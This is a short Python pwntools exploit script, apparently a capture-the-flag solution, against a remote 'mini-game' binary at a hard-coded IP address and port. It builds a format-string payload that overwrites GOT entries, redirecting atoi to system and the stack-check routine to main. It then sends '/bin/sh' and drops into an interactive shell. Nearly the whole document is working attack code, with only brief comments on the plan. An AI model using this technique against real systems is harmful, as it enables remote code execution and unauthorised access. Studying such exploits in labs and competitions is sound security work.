''' format string at printf status'''
from pwn import *
def alignment8(payload):
	lenCur = len(payload)
	remain = lenCur%8
	fillByte = 8-remain
	newPayload = payload.ljust(lenCur+fillByte,'a')
	return newPayload
debug = 0
if debug:
	s = process("./mini-game")
	raw_input('debug')
else:
	s = remote("103.237.99.35",28993)

s.sendlineafter("Name of your Hero: ", 'tuan')
s.sendlineafter("Your Choice: ",'2')
s.sendlineafter('(Y/N)','Y')

check_stack_got=0x602020
atoi_got=0x602078
systemplt_6= 0x4007b6
system_got = 0x602030

''' secarino
- modified canary
- overwrite the check_stack_got -> main: 0x400B56
- overwrite the atoi_got -> system_plt
'''
'''
system -> main
got_atoi -> systemplt+6 0x4007b6
'''
payload = '%10$n' 
payload += '%' + str(0x40) + 'x%11$hn'
payload += '%' + str(0x7b6-0x40) + 'x%12$hn'
payload += '%' + str(0xb56-0x7b6) + 'x%9$hn'
payload = alignment8(payload)
payload += p64(system_got) #0b56 9
payload += p64(atoi_got+4) # 0000 _10
payload += p64(atoi_got+2) # 0060 _11
payload += p64(atoi_got)   # 2030 _12
s.sendlineafter('Status: ',payload)

s.sendlineafter("Name of your Hero: ", 'tuan')
s.sendlineafter("Your Choice: ",'/bin/sh\x00')

s.interactive()
s.close()
